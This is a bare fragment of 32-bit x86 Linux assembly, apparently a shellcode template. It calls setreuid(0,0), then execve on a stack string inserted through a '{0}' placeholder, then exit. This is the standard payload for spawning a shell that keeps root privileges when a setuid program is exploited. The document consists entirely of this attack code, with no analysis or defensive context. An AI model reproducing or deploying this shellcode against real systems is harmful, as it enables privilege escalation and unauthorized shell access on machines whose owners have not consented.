mov    $0x46,%al
xor    %ebx,%ebx
xor    %ecx,%ecx
int    $0x80
{0}
mov    %esp,%ebx
xor    %eax,%eax
mov    $0xb,%al
int    $0x80
mov    $0x1,%al
mov    $0x1,%bl
int    $0x80